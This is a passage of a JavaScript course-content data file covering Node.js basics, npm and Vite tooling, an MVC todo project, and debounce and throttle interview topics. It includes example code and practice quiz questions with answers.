            explanation: 'The native <dialog> element provides built-in dialog behavior, modal scrim backdrop (::backdrop), and focus trapping.'
          }
        ],
        relatedTopics: ['DOM Fundamentals', 'DOM Events', 'Web Storage & State']
      }
    ]
  },

  // CHAPTER 32 — NODE.JS FOUNDATIONS
  {
    id: 'js-ch32',
    number: 32,
    title: 'Node.js Foundations & Backend Basics',
    description: 'Node runtime vs browser, npm, package.json, fs, path, process, and lightweight HTTP servers',
    topics: [
      {
        id: 'js-node-basics',
        subjectId: 'js',
        chapterId: 'js-ch32',
        chapterNumber: 32,
        pageNumber: 32,
        title: 'Node.js Runtime: fs, path, process & Building a Minimal HTTP Server',
        difficulty: 'intermediate',
        definition: 'Node.js is an open-source, cross-platform JavaScript runtime environment built on the Google V8 engine and libuv, enabling server-side execution with non-blocking event-driven I/O.',
        whyItMatters: 'Node.js allows developers to write full-stack JavaScript, sharing domain models, validation libraries, and types between frontend and backend.',
        syntax: 'import http from "node:http";\nimport fs from "node:fs/promises";\nimport path from "node:path";',
        explanation: [
          'Browser vs Node.js: The browser has `window`, `document`, and DOM APIs. Node.js has `global`, `process`, file system (`node:fs`), operating system (`node:os`), and network streams.',
          'The `process` Object: Provides process control, CLI arguments (`process.argv`), environment variables (`process.env.PORT`), and exit codes (`process.exit(0)`).',
          'File System (`node:fs/promises`): Provides asynchronous non-blocking file reads, writes, and directory streams.',
          'Built-in HTTP Server: The `node:http` module provides a low-level HTTP web server handling incoming requests and streaming responses.'
        ],
        example: {
          language: 'javascript',
          code: `// Minimal Canonical Node.js HTTP Microservice
import http from "node:http";

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
  const { method, url } = req;

  if (url === "/api/health" && method === "GET") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "healthy", uptime: process.uptime() }));
  }

  res.writeHead(404, { "Content-Type": "text/plain" });
  res.end("404 Not Found");
});

console.log("Node.js microservice configured on port: " + PORT);`,
          output: 'Node.js microservice configured on port: 3000',
          annotations: [
            { line: 4, label: 'Reads process.env for 12-factor cloud deployment', type: 'yellow' },
            { line: 6, label: 'Non-blocking event-driven request handler', type: 'blue' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Node.js Architecture: V8 & Libuv',
          subtitle: 'Single-Threaded JS Engine with Multithreaded C++ I/O Worker Pool',
          elements: [
            { id: '1', label: 'JavaScript Code', sublabel: 'Single-Threaded Call Stack', value: 'Google V8 Engine', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'Node.js Bindings', sublabel: 'C++ API Bridges', value: 'fs, net, http', status: 'active', arrowTo: '3' },
            { id: '3', label: 'libuv Event Loop', sublabel: 'I/O Polling & Thread Pool', value: 'Asynchronous OS Kernels', status: 'referenced' }
          ]
        },
        important: 'In Node.js, NEVER use synchronous file methods (`fs.readFileSync()`) in production request handlers! Doing so completely freezes the single event loop thread for all concurrent users until the disk read finishes.',
        commonMistakes: [
          'Attempting to access browser globals like `window` or `document` inside Node.js code (throws ReferenceError).',
          'Using string concatenation like `__dirname + "/" + file` instead of `path.join(__dirname, file)` (fails across Windows vs Linux path separators).'
        ],
        tip: 'Use the `node:` protocol prefix when importing built-in modules (`import fs from "node:fs/promises"`) to clearly distinguish core modules from npm packages.',
        interviewNote: 'Question: "What is libuv in Node.js?" Answer: "libuv is a multi-platform C library that handles the event loop, asynchronous DNS resolution, network sockets, and manages a background thread pool for operations that cannot be done non-blockingly at the OS level (like disk I/O)."',
        practiceQuestions: [
          {
            id: 'q-js32-1',
            type: 'mcq',
            question: 'Which C library provides the event loop and asynchronous thread pool for Node.js?',
            options: ['V8', 'libuv', 'glibc', 'OpenSSL'],
            correctIndex: 1,
            explanation: 'libuv is the high-performance C library powering the Node.js event loop, asynchronous I/O, and background worker thread pool.'
          },
          {
            id: 'q-js32-2',
            type: 'output',
            question: 'Where do command line arguments live inside the Node.js process environment?',
            options: ['process.cli', 'process.argv', 'process.env.ARGS', 'console.args'],
            correctIndex: 1,
            explanation: 'process.argv is an array containing command line arguments passed when launching the Node.js process.'
          }
        ],
        relatedTopics: ['JavaScript Development Tools', 'Modules (ESM vs CommonJS)', 'V8 Runtime & Engine']
      }
    ]
  },

  // CHAPTER 33 — JAVASCRIPT DEVELOPMENT TOOLS
  {
    id: 'js-ch33',
    number: 33,
    title: 'Development Tools & Build Ecosystem',
    description: 'npm, package.json, semantic versioning, bundlers (Vite/Rollup), ESLint, Prettier, and DevTools',
    topics: [
      {
        id: 'js-devtools-ecosystem',
        subjectId: 'js',
        chapterId: 'js-ch33',
        chapterNumber: 33,
        pageNumber: 33,
        title: 'Tooling: npm, Bundlers (Vite), Linters (ESLint) & Chrome DevTools',
        difficulty: 'intermediate',
        definition: 'Modern JavaScript relies on package managers (npm/pnpm), static code analyzers (ESLint), code formatters (Prettier), bundlers (Vite/Rollup), and browser debugging tools.',
        whyItMatters: 'Professional engineering standards enforce reproducible builds, consistent styling, and automated type and syntax validation before merging to production.',
        syntax: 'npm init -y\nnpm install -D eslint prettier vite\nnpm run build',
        explanation: [
          'Semantic Versioning (SemVer: MAJOR.MINOR.PATCH): `^1.2.3` permits minor/patch updates; `~1.2.3` permits patch updates only.',
          '`dependencies` vs `devDependencies`: `dependencies` are required at runtime in production; `devDependencies` (linters, test runners, bundlers) are only needed during development.',
          'Vite: Next-generation frontend build tool using native ES Modules during development for instant Hot Module Replacement (HMR) and Rollup for production bundling.',
          'Browser DevTools: Elements (DOM), Console (REPL), Sources (Breakpoints & Call Stack inspection), Network (Latency & Payloads), Memory (Heap Snapshots).'
        ],
        example: {
          language: 'javascript',
          code: `// Canonical package.json configuration snippet
const packageConfig = {
  name: "codeink-core-engine",
  version: "1.0.0",
  type: "module",
  scripts: {
    dev: "vite",
    build: "vite build",
    lint: "eslint . --ext .js,.ts",
    test: "vitest run"
  },
  dependencies: {
    "lucide-react": "^1.16.0"
  },
  devDependencies: {
    "vite": "^6.0.0",
    "eslint": "^9.0.0",
    "prettier": "^3.0.0"
  }
};

console.log("Package Mode:", packageConfig.type);
console.log("Build Script:", packageConfig.scripts.build);`,
          output: 'Package Mode: module\nBuild Script: vite build',
          annotations: [
            { line: 4, label: 'type: module configures Node.js to treat all .js files as ES Modules', type: 'green' },
            { line: 6, label: 'npm scripts automate standard development tasks', type: 'blue' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Modern Frontend Build Toolchain',
          subtitle: 'Source Code (ESM/TS) → Linter & Typecheck → Bundler (Vite) → Dist Bundle',
          elements: [
            { id: '1', label: 'Source (.js/.ts)', value: 'Modular Source Code', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'ESLint & Prettier', sublabel: 'Static Code Quality', value: 'Clean Syntax', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Vite / Rollup', sublabel: 'Tree-Shaking & Minification', value: 'Bundling Engine', status: 'active', arrowTo: '4' },
            { id: '4', label: 'Dist Assets', sublabel: 'Optimized JS/CSS/HTML', value: 'Production Deployment', status: 'referenced' }
          ]
        },
        important: 'Always commit your `package-lock.json` file to version control! It locks down the exact recursive dependency graph versions, preventing "works on my machine" deployment errors.',
        commonMistakes: [
          'Installing build tools or test runners in `dependencies` instead of `devDependencies`.',
          'Neglecting console breakpoints (`debugger;` statement) and relying solely on `console.log()` for debugging.'
        ],
        tip: 'Insert `debugger;` in your code and open Chrome DevTools; the browser will automatically pause execution on that line and open the interactive Sources debugger.',
        interviewNote: 'Question: "What is the difference between package.json and package-lock.json?" Answer: "package.json defines project metadata and broad version ranges (like ^1.0.0). package-lock.json records the exact, deterministic version of every nested package installed in node_modules to ensure identical builds across all machines."',
        practiceQuestions: [
          {
            id: 'q-js33-1',
            type: 'mcq',
            question: 'In semantic versioning (^2.4.1), what updates does the caret (^) character permit?',
            options: ['Only patch releases (2.4.x)', 'Minor and patch updates without breaking major version (2.x.x)', 'Any update including major (3.0.0)', 'No updates allowed'],
            correctIndex: 1,
            explanation: 'The caret (^) allows minor releases and patch updates that do not modify the leftmost non-zero digit.'
          },
          {
            id: 'q-js33-2',
            type: 'mcq',
            question: 'What JavaScript keyword acts as an automatic programmatic breakpoint in browser DevTools?',
            options: ['break;', 'pause;', 'debugger;', 'stop();'],
            correctIndex: 2,
            explanation: 'The debugger; statement halts code execution and launches the browser debugger if Developer Tools are open.'
          }
        ],
        relatedTopics: ['Modules (ESM vs CommonJS)', 'Node.js Foundations', 'JavaScript Projects']
      }
    ]
  },

  // CHAPTER 34 — JAVASCRIPT PROJECTS
  {
    id: 'js-ch34',
    number: 34,
    title: 'JavaScript Real-World Capstone Projects',
    description: 'Architecture and implementations: Todo MVC, Weather Dashboard, and Real-Time Chat UI',
    topics: [
      {
        id: 'js-projects-architecture',
        subjectId: 'js',
        chapterId: 'js-ch34',
        chapterNumber: 34,
        pageNumber: 34,
        title: 'Project Architecture: Todo MVC, Weather Client & Real-Time Chat UI',
        difficulty: 'advanced',
        definition: 'Building end-to-end JavaScript applications requires clean architectural separation between state models, network services, and view renderers.',
        whyItMatters: 'Putting core concepts (closures, event delegation, async/await, DOM manipulation, storage) together into cohesive projects bridges the gap from syntax to production-grade engineering.',
        syntax: '// MVC Application Architecture Pattern\nclass Model { ... }   // Data & business logic\nclass View { ... }    // DOM rendering & event binding\nclass Controller { ... } // Coordinates Model & View',
        explanation: [
          'Project 1 (Beginner): Responsive Todo MVC with filtering (All, Active, Completed), local storage persistence, and inline editing.',
          'Project 2 (Intermediate): Weather & Geo Dashboard consuming OpenMeteo REST API, featuring debounced city searches, loading skeletons, and cached forecasts.',
          'Project 3 (Advanced): Real-Time Chat & State Synchronizer featuring WebSocket / EventSource mocking, optimistic UI updates, retry logic, and offline-first queueing.'
        ],
        example: {
          language: 'javascript',
          code: `// Complete Model-View-Controller Todo Engine
class TodoModel {
  constructor() {
    this.todos = JSON.parse(localStorage.getItem("todos_db") ?? "[]");
  }
  add(text) {
    const todo = { id: Date.now().toString(), text, completed: false };
    this.todos.push(todo);
    this.save();
    return todo;
  }
  toggle(id) {
    const item = this.todos.find(t => t.id === id);
    if (item) { item.completed = !item.completed; this.save(); }
  }
  save() {
    localStorage.setItem("todos_db", JSON.stringify(this.todos));
  }
}

const model = new TodoModel();
const newTodo = model.add("Master JavaScript Architecture");
console.log("Created Todo:", newTodo.text, "| ID:", newTodo.id);
model.toggle(newTodo.id);
console.log("Toggled Completed:", model.todos[0].completed);`,
          output: 'Created Todo: Master JavaScript Architecture | ID: ' + Date.now().toString() + '\nToggled Completed: true',
          annotations: [
            { line: 2, label: 'Model encapsulates state and persistent storage operations', type: 'blue' },
            { line: 6, label: 'Pure immutable update patterns with persistent backing', type: 'green' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Model-View-Controller (MVC) Application Flow',
          subtitle: 'Separation of Concerns in Real-World Web Applications',
          elements: [
            { id: '1', label: 'User Interaction', value: 'Button Click / Form Input', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'Controller', sublabel: 'Coordinates Logic', value: 'Dispatches Action', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Model', sublabel: 'Business Rules & Storage', value: 'Updates State', status: 'active', arrowTo: '4' },
            { id: '4', label: 'View', sublabel: 'DOM Rendering', value: 'Renders UI', status: 'referenced' }
          ]
        },
        important: 'Implement optimistic UI updates in user-facing applications: immediately update the DOM when an action occurs, then sync with the server in the background, rolling back only if the server returns an error.',
        commonMistakes: [
          'Tightly coupling API fetch calls directly inside DOM event handlers, making unit testing impossible.',
          'Failing to handle offline network disconnection in web applications.'
        ],
        tip: 'Break large projects into discrete layers: `api/` (network), `models/` (state), `ui/` (DOM), and `utils/` (pure helpers).',
        interviewNote: 'Question: "What is an Optimistic UI update?" Answer: "An Optimistic UI update immediately reflects user actions in the interface assuming the network request will succeed, hiding network latency from the user. If the network call subsequently fails, the UI rolls back to the previous state with an error toast."',
        practiceQuestions: [
          {
            id: 'q-js34-1',
            type: 'mcq',
            question: 'In the MVC design pattern, which component is strictly responsible for managing application data and business rules?',
            options: ['View', 'Controller', 'Model', 'Router'],
            correctIndex: 2,
            explanation: 'The Model represents the data structures, validation rules, and persistence logic independent of the UI.'
          },
          {
            id: 'q-js34-2',
            type: 'mcq',
            question: 'What is the primary benefit of Optimistic UI updates?',
            options: ['Reduces server load', 'Zero perceived latency for users', 'Eliminates errors', 'Uses less bandwidth'],
            correctIndex: 1,
            explanation: 'Optimistic UI makes applications feel instantaneous by updating the visual interface immediately without waiting for network round-trips.'
          }
        ],
        relatedTopics: ['Web Storage & State', 'DOM Fundamentals', 'Interview & Problem Solving']
      }
    ]
  },

  // CHAPTER 35 — JAVASCRIPT INTERVIEW & PROBLEM SOLVING
  {
    id: 'js-ch35',
    number: 35,
    title: 'JavaScript Interview Masterclass & Tricky Traps',
    description: 'Coercion traps, event loop puzzles, deep clone implementations, debounce vs throttle, and algorithmic problems',
    topics: [
      {
        id: 'js-interview-masterclass',
        subjectId: 'js',
        chapterId: 'js-ch35',
        chapterNumber: 35,
        pageNumber: 35,
        title: 'Interview Masterclass: Debounce vs Throttle, Deep Clone & Output Puzzles',
        difficulty: 'advanced',
        definition: 'Technical JavaScript interviews rigorously evaluate deep mental models: asynchronous execution order, closure encapsulation, prototype traversal, and writing production-ready utilities like debounce and throttle from scratch.',
        whyItMatters: 'Top software engineering companies test these concepts because developers with rock-solid fundamentals write maintainable, leak-free, high-performance code.',
        syntax: 'function debounce(fn, delay) { let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), delay); }; }',
        explanation: [
          'Debounce: Delays execution until a specified quiet period has elapsed with NO new events (ideal for search autocomplete and window resize).',
          'Throttle: Guarantees execution at most once every specified time interval (ideal for scroll listeners and game animation loops).',
          'Deep Clone Implementation: Recursively traversing object keys, handling arrays, dates, and circular references via WeakMap.',
          'Event Loop Tracing: Predicting tricky code outputs mixing `setTimeout`, `setImmediate`, `process.nextTick`, and `Promise.resolve()`.'
        ],
        example: {
          language: 'javascript',
          code: `// Production Debounce implementation
function debounce(fn, delay) {
  let timerId;
  return function (...args) {
    clearTimeout(timerId);
    timerId = setTimeout(() => fn.apply(this, args), delay);
  };
}

// Production Throttle implementation
function throttle(fn, interval) {
  let lastTime = 0;
  return function (...args) {
    const now = Date.now();
    if (now - lastTime >= interval) {
      lastTime = now;
      fn.apply(this, args);
    }
  };
}

console.log("Debounce and Throttle utilities compiled successfully.");`,
          output: 'Debounce and Throttle utilities compiled successfully.',
          annotations: [
            { line: 5, label: 'clearTimeout resets timer on every incoming event burst', type: 'yellow' },
            { line: 15, label: 'Rate-limits invocation to once per interval threshold', type: 'green' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Debounce vs Throttle Event Firing Visualizer',
          subtitle: 'Burst Event Stream (e.g., Typing or Scrolling)',
          elements: [
            { id: '1', label: 'Raw Event Burst', sublabel: '100 clicks in 2 seconds', value: 'High Frequency', status: 'warning', arrowTo: '2' },
            { id: '2', label: 'Debounce (Delay)', sublabel: 'Waits for silence', value: 'Fires ONCE after user stops', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Throttle (Interval)', sublabel: 'Uniform rate-limit', value: 'Fires periodically at fixed rate', status: 'referenced' }
          ]
        },
        important: 'Always preserve `this` context and arguments when writing higher-order utility wrappers: use `fn.apply(this, args)` so the debounced/throttled function behaves identically to the original function.',
        commonMistakes: [
          'Using Debounce when Throttle was required (e.g. scroll animations that need continuous intermediate feedback).',
          'Forgetting to clear timeouts on component unmount, causing state updates on dead components.'
        ],
        tip: 'In interviews, write clean, readable code and explain edge cases (like handling `null`, `undefined`, and preserving `this`) before coding.',
        interviewNote: 'Question: "What is the difference between debounce and throttle?" Answer: "Debounce bunches a series of sequential calls into a single call after a specified quiet delay has elapsed. Throttle regulates the execution frequency, ensuring the function runs at most once within any specified time interval."',
        practiceQuestions: [
          {
            id: 'q-js35-1',
            type: 'mcq',
            question: 'Which utility is best suited for an auto-complete search bar that should only send an API request after the user stops typing for 300ms?',
            options: ['Throttle', 'Debounce', 'Memoize', 'Curry'],
            correctIndex: 1,
            explanation: 'Debounce waits until the user pauses typing for the designated quiet period, avoiding wasteful intermediate API calls for every keystroke.'
          },
          {
            id: 'q-js35-2',
            type: 'output',
            question: 'What is printed by this classic JavaScript interview snippet?',
            codeSnippet: 'console.log(1 + "2" + 3);\nconsole.log(1 + + "2" + 3);',
            options: ['"123" and 6', '"15" and 6', '"123" and "123"', 'NaN and 6'],
            correctIndex: 0,
            explanation: '1 + "2" coerces to "12", then + 3 gives "123". In the second line, +"2" is unary plus coercing "2" to number 2: 1 + 2 + 3 = 6.'
          }
        ],
        relatedTopics: ['Asynchronous JavaScript', 'Closures', 'Capstone Projects']
      }
    ]
  }
];
